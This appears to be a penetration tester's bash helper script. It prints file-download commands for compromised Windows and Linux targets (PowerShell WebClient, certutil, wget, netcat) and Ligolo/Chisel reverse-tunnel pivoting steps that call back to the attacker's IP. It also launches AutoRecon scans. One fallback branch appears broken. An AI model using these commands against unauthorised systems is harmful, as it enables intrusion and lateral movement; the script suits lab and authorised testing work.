#!/bin/bash
# ─────────────────────────────────────────────
# RAVISAI TOOLKIT - combined by @RSVamil
# GitHub: https://github.com/ravisairockey
# ─────────────────────────────────────────────

# ASCII ART
cat << "EOF"
RRRRRRRRRRRRRRRRR      SSSSSSSSSSSSSSS VVVVVVVV           VVVVVVVV
R::::::::::::::::R   SS:::::::::::::::SV::::::V           V::::::V
R::::::RRRRRR:::::R S:::::SSSSSS::::::SV::::::V           V::::::V
RR:::::R     R:::::RS:::::S     SSSSSSSV::::::V           V::::::V
  R::::R     R:::::RS:::::S             V:::::V           V:::::V 
  R::::R     R:::::RS:::::S              V:::::V         V:::::V  
  R::::RRRRRR:::::R  S::::SSSS            V:::::V       V:::::V   
  R:::::::::::::RR    SS::::::SSSSS        V:::::V     V:::::V    
  R::::RRRRRR:::::R     SSS::::::::SS       V:::::V   V:::::V     
  R::::R     R:::::R       SSSSSS::::S       V:::::V V:::::V      
  R::::R     R:::::R            S:::::S       V:::::V:::::V       
  R::::R     R:::::R            S:::::S        V:::::::::V        
RR:::::R     R:::::RSSSSSSS     S:::::S         V:::::::V         
R::::::R     R:::::RS::::::SSSSSS:::::S          V:::::V          
R::::::R     R:::::RS:::::::::::::::SS            V:::V           
RRRRRRRR     RRRRRRR SSSSSSSSSSSSSSS               VVV            

crafted by @RSVamil | GitHub :- https://github.com/ravisairockey
EOF

# ─────────────────────────────────────────────
# COLORS & STYLES
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
PURPLE=$(tput setaf 5)
NC=$(tput sgr0)
bold=$(tput bold)
ul=$(tput smul)
MAGENTA='\033[0;35m'

# ─────────────────────────────────────────────
# GET LOCAL IP
get_ip() {
  if [ -n "$(ifconfig tun0 2>/dev/null)" ]; then
    ip=$(ifconfig tun0 | grep -Eo 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
  elif [ -n "$(ifconfig eth0 2>/dev/null)" ]; then
    ip=$(ifconfig eth0 | grep -Eo 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
  elif [ -n "$(ifconfig wlan0 2>/dev/null)" ]; then
    ip=$(ifconfig wlan0 | grep -Eo 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
  else
    echo -e "${RED}Error: Unable to retrieve IP.${NC}"
    read -rp "Enter IP manually: " ip
  fi
}

# ─────────────────────────────────────────────
# TRANSFILE FUNCTION
transfile() {
  filename=${1:-"filename.txt"}
  platform=$2
  port=$3

  get_ip

  if [ "$filename" = "-h" ]; then
    printf "${RED}Usage: ${NC}transfile filename platform port\n"
    printf "\n        platform - w for windows or l for linux\n"
    printf "        port - optional (default 80)\n"
    exit
  fi

  if [ "$platform" == "w" ]; then
    printf "\n${RED}========== WINDOWS ==========${NC}\n"
    printf "${YELLOW}Download:${NC}\n"
    printf "${BLUE}wget:${NC} wget http://$ip:$port/$filename -O $filename\n"
    printf "${BLUE}Powershell:${NC} powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$filename','$filename')\n"
    printf "${BLUE}Certutil:${NC} certutil -urlcache -f http://$ip:$port/$filename $filename\n"
  elif [ "$platform" == "l" ]; then
    printf "\n${RED}========== LINUX ==========${NC}\n"
    printf "${BLUE}wget:${NC} wget http://$ip:$port/$filename\n"
    printf "${BLUE}Netcat:${NC} cat $filename | nc $ip 1234 (receiver: nc -l -p 1234 > $filename)\n"
    printf "${BLUE}SCP:${NC} scp $filename user@remote:/path/\n"
  else
    "$0" "$filename" "w"
    "$0" "$filename" "l"
  fi
}

# ─────────────────────────────────────────────
# PROXIFY FUNCTION (ligolo & chisel)
proxify() {
  platform=$1
  method=$2

  if [[ -z "$platform" || -z "$method" ]]; then
    printf "${RED}Usage: ${NC}proxify platform method\n"
    printf " platform: w (windows) or l (linux)\n"
    printf " method: l (ligolo) or c (chisel)\n"
    return
  fi

  get_ip

  ligolo_method() {
    printf "\n${RED}========== LIGOLO ==========${NC}\n"
    printf "${YELLOW}${ul}${bold}Kali:${NC}\n"
    printf "${PURPLE}sudo ip tuntap add user \$USER mode tun ligolo\n"
    printf "sudo ip link set ligolo up\n"
    printf "cd ligolo && ./proxy -selfcert\n"
    printf "${GREEN}Port forward:${NC} listener_add --addr 0.0.0.0:from_port --to 0.0.0.0:our_port\n"
    printf "${YELLOW}${ul}${bold}Target:${NC}\n"
    if [ "$platform" = "l" ]; then
      printf "${PURPLE}./agent -connect $ip:11601 -ignore-cert -retry${NC}\n"
    else
      printf "${PURPLE}.\\agent.exe -connect $ip:11601 -ignore-cert -retry${NC}\n"
    fi
  }

  chisel_method() {
    printf "\n${RED}========== CHISEL ==========${NC}\n"
    printf "${YELLOW}${ul}${bold}Kali:${NC}\n"
    printf "${PURPLE}chisel server --reverse --socks5 -p 8001${NC}\n"
    printf "${YELLOW}${ul}${bold}Target:${NC}\n"
    if [ "$platform" = "l" ]; then
      printf "${PURPLE}./chisel client $ip:8001 R:socks${NC}\n"
    else
      printf "${PURPLE}.\\chisel.exe client $ip:8001 R:socks${NC}\n"
    fi
  }

  if [ "$method" = "l" ]; then
    transfile "agent" "$platform" 80
    ligolo_method
  elif [ "$method" = "c" ]; then
    transfile "chisel" "$platform" 80
    chisel_method
  else
    printf "${RED}Invalid method.${NC}\n"
  fi
}

# ─────────────────────────────────────────────
# AUTORECON INIT FUNCTION
autorecon_init() {
  machine=$1
  if [ -z "$machine" ]; then
    echo -e "${RED}Usage: autorecon_init <machine_name>${NC}"
    return
  fi
  mkdir "$machine"
  cd "$machine" || exit
  cp /home/kali/Documents/Pentest.ctb "$machine.ctb"
  echo -e "${MAGENTA}Give IP for autorecon:${NC}"
  read -r ip
  sudo autorecon "$ip"
}

# ─────────────────────────────────────────────
# MENU
echo -e "\n${GREEN}Choose option:${NC}"
echo "1) Transfile"
echo "2) Proxify"
echo "3) Autorecon Init"
read -rp "Enter choice: " choice

case $choice in
  1)
    read -rp "Enter filename: " fname
    read -rp "Platform (w/l): " plat
    read -rp "Port (default 80): " port
    transfile "$fname" "$plat" "$port"
    ;;
  2)
    read -rp "Platform (w/l): " plat
    read -rp "Method (l=ligolo/c=chisel): " method
    proxify "$plat" "$method"
    ;;
  3)
    read -rp "Enter machine name: " mname
    autorecon_init "$mname"
    ;;
  *)
    echo -e "${RED}Invalid choice.${NC}"
    ;;
esac
